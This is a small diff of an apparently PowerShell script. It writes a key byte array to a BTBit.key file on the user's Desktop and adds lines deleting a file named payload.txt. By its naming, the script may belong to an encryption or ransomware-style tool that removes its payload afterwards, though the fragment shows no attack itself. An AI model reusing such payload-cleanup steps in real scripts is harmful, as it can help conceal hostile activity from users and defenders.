@@ -35,3 +35,5 @@ $bytes = $Null
 $userDesk = [Environment]::GetFolderPath("Desktop")
 sc -Value $key -LiteralPath "$userDesk/BTBit.key" -Encoding byte
 #
+# remove payload.txt
+rm ./payload.txt
